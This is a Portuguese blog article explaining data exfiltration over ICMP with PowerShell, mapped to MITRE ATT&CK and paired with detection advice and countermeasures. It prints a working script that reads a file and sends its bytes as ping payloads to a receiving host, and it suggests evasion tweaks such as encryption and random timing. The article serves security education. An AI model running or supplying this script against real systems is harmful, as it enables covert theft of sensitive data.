---
title: "Exfiltração de Dados Usando PowerShell e ICMP: Uma Abordagem Técnica"
date: 2024-09-27T15:07:00-03:00
featured: false
draft: false
comment: true
toc: true
reward: true
pinned: false
carousel: false
description: Este artigo aborda a exfiltração de dados via PowerShell e ICMP, explicando como um script envia dados discretamente por pacotes de ping.
series:
 - Casos de Uso
categories:
 - PowerShell
 - Exfiltração de Dados
tags:
 - ICMP
 - MITRE ATT&CK
 - Cyber Kill Chain
 - Segurança de Rede
authors:
  - sandson
images:
#  - 
# menu:
#   main:
#     weight: 100
#     params:
#       icon:
#         vendor: bs
#         name: book
#         color: '#e24d0e'
---

## !!!DISCLAIMER!!!

**O uso dessas ferramentas e métodos abordados aqui contra redes para os quais você não possui permissão explícita é ilegal e pode resultar em consequências legais. É sua responsabilidade garantir que você tenha autorização apropriada antes de realizar qualquer teste. O uso inadequado pode causar danos e resultar em penalidades severas. Ao utilizar essas informações, você concorda em assumir total responsabilidade por suas ações. Lembre-se! Isto é apenas um artigo técnico para fins educacionais.**

## 1. Introdução

No cenário atual de segurança cibernética, a exfiltração de dados continua sendo uma das ameaças mais graves para as organizações. Técnicas avançadas, muitas vezes discretas, estão sendo desenvolvidas para contornar sistemas de detecção tradicionais. Entre essas técnicas, o uso de protocolos de rede comuns, como o ICMP (Internet Control Message Protocol), torna-se uma maneira engenhosa de transferir dados sem levantar suspeitas.

Este artigo explora uma técnica de exfiltração que utiliza PowerShell para ler um arquivo binário e transmiti-lo em partes via pacotes ICMP, com o comando ping como vetor de envio. Vamos entender completamente como o script PowerShell foi desenvolvido em detalhes e discutir seu funcionamento técnico, bem como os desafios e contramedidas que as equipes de segurança podem aplicar.

Este conteúdo tem como base uma publicação que fiz no LinkedIn, que pode ser acessada [clicando aqui](https://www.linkedin.com/feed/update/urn:li:activity:7244405255478628352/).

## 2. O problema e sua relevância

É indiscutível que constantemente novas técnicas surgem e a sofisticação das táticas de invasores, somada ao uso de ferramentas legítimas para fins maliciosos, apresenta um grande desafio para os analistas de segurança. O uso de ICMP para exfiltração de dados é uma ameaça difícil de detectar, pois o protocolo é amplamente utilizado para diagnósticos de rede e raramente é monitorado em profundidade nos sistemas de segurança tradicionais, como os SIEMs.

Além disso, o PowerShell, por ser uma ferramenta administrativa legítima, está frequentemente presente em ambientes corporativos, tornando-o uma escolha comum para movimentação lateral e exfiltração de dados. Quando combinado com o ICMP, essa abordagem pode passar despercebida por firewalls e outros sistemas de segurança que não monitoram esse tráfego.

## 3. Analisando o Script

O script apresentado é relativamente simples, mas extremamente eficiente. Vamos entender por partes:

```powershell {title="ping_exfiltration.ps1"}
$filePath = 'F:/cpf.txt'
$binaryData = [System.IO.File]::ReadAllBytes($filePath)
$ping = New-Object System.Net.NetworkInformation.Ping
$chunkSize = 50000
```

**1. Definição do Caminho do Arquivo:** O script começa definindo o caminho do arquivo alvo `F:/cpf.txt`, que será lido em formato binário. A função `[System.IO.File]::ReadAllBytes` lê o conteúdo completo do arquivo como um array de bytes. No exemplo, eu usei uma lista de CPFs gerados por ferramentas de geradores automáticos, mas na prática esse arquivo pode conter qualquer tipo de informação sensível e confidencial, como dados financeiros.

**2. Inicialização do Objeto Ping:** A classe `System.Net.NetworkInformation.Ping` é instanciada para enviar pacotes ICMP. Isso permite que o script use o protocolo ICMP echo request (mais conhecido como "ping") para enviar pacotes de dados.

**3. Definição do Tamanho dos Pacotes:** O script define o tamanho de cada chunk de dados que será enviado via ICMP. Neste caso, o valor é 50.000 bytes. Nos meus testes, o valor de 50.000 bytes foi suficiente para enviar uma lista de CPFs de 500 linhas em um único envio, só que na recepção dos logs, no tcpdump, ele veio em partes, mas mesmo assim eu recebi os CPFs completos. Iremos entender um pouco melhor mais a frente.

```powershell {title="ping_exfiltration.ps1"}
for ($i = 0; $i -lt $binaryData.Length; $i += $chunkSize) {
    $chunk = $binaryData[$i..[math]::Min($i + $chunkSize - 1, $binaryData.Length - 1)]
    $ping.Send('192.168.145.30', 1500, $chunk)
}
```
**4. Fragmentação dos Dados:** A cada iteração do loop `for`, uma parte (`chunk`) do arquivo binário é selecionada para ser enviada. A função `[math]::Min` garante que o script não tente ler além do final do array de bytes.

**5. Envio Via Ping:** Cada `chunk` é então enviado via o método `Send` do objeto `Ping`. Aqui, o IP de destino (`192.168.145.30`) representa a máquina que está recebendo os dados e lá está com o `tcpdump` ativo escutando pacotes `icmp` na rede. O tempo limite para a resposta do ping é definido como 1500 ms.

Com isso, nós temos a saída em pleno funcionamento:

![Exfiltração](exfiltracao.gif)

Em Referências, eu deixo um link muito legal para um artigo no Medium que dá detalhes sobre o pacote ICMP.

## 4. Onde o script se encaixa na Matriz do MITRE ATT&CK e na Cyber Kill Chain

### MITRE ATT&CK Framework

Este tipo de ataque pode ser mapeado diretamente no framework MITRE ATT&CK nas seguintes táticas e técnicas:

**Tactic: Exfiltration (TA0010)**

***Technique: Exfiltration Over Alternative Protocol (T1048):*** Esta técnica descreve o uso de protocolos incomuns para exfiltração de dados, como o ICMP. No nosso caso, estamos usando o comando `ping` para enviar fragmentos de um arquivo binário como payload de pacotes ICMP.

***Sub-technique: Exfiltration Over ICMP (T1048.003):*** Aqui, o uso específico de ICMP como vetor de exfiltração se aplica perfeitamente, uma vez que os dados são encapsulados e enviados por pacotes ICMP para evitar a detecção.

### Cyber Kill Chain

Dentro da **Cyber Kill Chain**, o processo descrito se encaixa na etapa de **Exfiltração**:

**1. Reconhecimento:** O atacante identifica que a rede permite tráfego ICMP e que o host de destino está acessível.

**2. Instalação e Comando & Controle (C2):** O script pode ser executado após o comprometimento da máquina, estabelecendo comunicação com o servidor de C2 através de pacotes ICMP, disfarçados de tráfego normal de diagnóstico.

**3. Exfiltração:** O atacante utiliza o script para fragmentar e enviar os dados sensíveis para fora da rede, evitando sistemas de monitoramento tradicionais.

## 5. Considerações Técnicas

**Limitações de Tamanho de Pacotes ICMP**

Embora o script esteja configurado para fragmentar o arquivo em pedaços de 50.000 bytes, o tamanho de pacotes ICMP geralmente não suporta fragmentos tão grandes. O valor típico é algo entre 1.470 e 1.480 bytes, dependendo da configuração da rede (MTU). Portanto, em um cenário real, esse tamanho precisaria ser ajustado para evitar que os pacotes sejam rejeitados. Nos meus testes, como falei mais acima, alterando o tamanho do pacote, ele me enviou vários pedaços menores várias vezes com uma única execução, mas um pacote do ICMP completo foi de 1472 bytes.

**Detecção de Tráfego ICMP**

O ICMP, geralmente, não é filtrado de forma agressiva em firewalls, uma vez que é utilizado para diagnósticos de rede. No entanto, a transmissão de pacotes ICMP contendo dados pode levantar suspeitas se o tráfego for analisado de perto. Ferramentas de análise de rede, como o Wireshark, podem identificar anomalias no payload dos pacotes ICMP. Outra forma também de identificar, é o tamanho do pacote. Por padrão, um ping tem entre 32 bytes e 40 bytes. Se passar disso, é possível que exista uma anomalia na rede e precisa ser investigado. Verificar também picos de tráfego na rede.

**Uso de PowerShell**

A Microsoft tem melhorado as medidas de segurança no Windows PowerShell. A ativação do PowerShell Logging e a utilização de ferramentas como Windows Defender Advanced Threat Protection (WDATP) podem capturar tentativas de execução de scripts maliciosos como este. No entanto, invasores podem tentar contornar esses controles com a execução de scripts em memória ou o uso de técnicas de evasão.

**Evasão de Segurança**

Para aumentar a furtividade, scripts como este podem utilizar técnicas adicionais, como criptografia dos dados antes da exfiltração ou fragmentação em pacotes menores para reduzir o risco de detecção. Outra técnica seria o envio aleatório de pacotes ao longo do tempo para evitar picos de tráfego suspeitos (É até engraçado, porque logo acima eu falei que picos de tráfego ICMP podem ser indícios de que algo está errado e aqui estou mostrando uma forma de ser furtivo hahahaha).

## 6. Desafios e Contramedidas

**Monitoramento de ICMP:** Implementar monitoramento e filtragem mais rigorosos de pacotes ICMP é uma das maneiras mais eficazes de mitigar essa técnica. Ferramentas de análise de tráfego de rede podem ser configuradas para alertar sobre tráfego ICMP incomum.

**Uso de PowerShell Constrained Language Mode:** Esse modo limita as funcionalidades do PowerShell, restringindo o uso de alguns comandos e objetos que podem ser usados de maneira maliciosa.

**Deep Packet Inspection (DPI):** Firewalls que utilizam DPI podem identificar e bloquear pacotes ICMP que contêm dados além do esperado, prevenindo a exfiltração.

## 7. Conclusão

A técnica descrita neste artigo ilustra como um invasor pode usar ferramentas legítimas para executar ações maliciosas de forma furtiva. O uso de PowerShell combinado com pacotes ICMP é uma abordagem engenhosa para a exfiltração de dados, que pode passar despercebida se não forem implementados controles de segurança adequados.

Este tipo de ataque enfatiza a importância de uma estratégia de defesa em profundidade, onde cada camada de segurança, desde o endpoint até a rede, desempenha um papel muito importante na defesa, detecção e mitigação de ameaças.

## 8. Referências

- [Windows Defender Advanced Threat Protection](https://learn.microsoft.com/en-us/windows/client-management/mdm/windowsadvancedthreatprotection-csp)
- [Configuration Service Provider](https://learn.microsoft.com/pt-br/windows/client-management/mdm/windowsadvancedthreatprotection-csp)
- [PowerShell Constrained Language Mode](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)
- [Método File.ReadAllBytes(String)](https://learn.microsoft.com/pt-br/dotnet/api/system.io.file.readallbytes?view=net-8.0)
- [Classe Ping](https://learn.microsoft.com/pt-br/dotnet/api/system.net.networkinformation.ping?view=net-8.0)
- [Método Math.Min](https://learn.microsoft.com/pt-br/dotnet/api/system.net.networkinformation.ping?view=net-8.0)
- [ICMP Ping Data Exfiltration](https://medium.com/@sam.rothlisberger/icmp-echo-request-data-exfiltration-f41f59fcf87a)

---
<!-- begin wwww.htmlcommentbox.com -->
  <div id="HCB_comment_box"><a href="http://www.htmlcommentbox.com">Widget</a> is loading comments...</div>
 <link rel="stylesheet" type="text/css" href="https://www.htmlcommentbox.com/static/skins/bootstrap/twitter-bootstrap.css?v=0" />
<!-- end www.htmlcommentbox.com -->